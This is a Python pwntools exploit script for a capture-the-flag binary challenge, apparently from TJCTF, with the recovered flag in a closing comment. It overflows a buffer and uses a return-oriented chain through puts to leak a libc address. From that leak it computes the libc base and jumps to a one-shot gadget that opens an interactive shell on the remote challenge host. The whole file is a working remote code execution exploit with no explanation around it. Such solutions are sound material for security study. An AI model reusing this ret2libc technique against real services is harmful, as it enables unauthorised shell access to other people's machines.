from pwn import *

r = remote('p1.tjctf.org', 8010)

offset = 88

puts_plt = 0x400640
puts_got = 0x600fb8
main_plt = 0x400797
pop_rdi = 0x400933

r.recvuntil('tasty?')

payload = ""
payload += "A"*offset
payload += p64(pop_rdi)
payload += p64(puts_got)
payload += p64(puts_plt)
payload += p64(main_plt)

r.sendline(payload)
r.recvuntil('anymore')
r.recvline()

leak = u64(r.recvline().strip().ljust(8, '\x00'))
libc_base = leak - 0x0809c0 # libc6_2.27-3ubuntu1_amd64
log.info('Leaked puts: {}'.format(hex(leak)))
log.info('LIBC base: {}'.format(hex(libc_base)))

r.recvuntil('tasty?')

payload = ""
payload += "A"*offset
payload += p64(libc_base + 0x10a38c) #oneshot

r.sendline(payload)
r.recvuntil('anymore')
log.info('Here is your shell :)')
r.interactive()

# flag: tjctf{c00ki3_yum_yum_mmMmMMmMMmmMm}
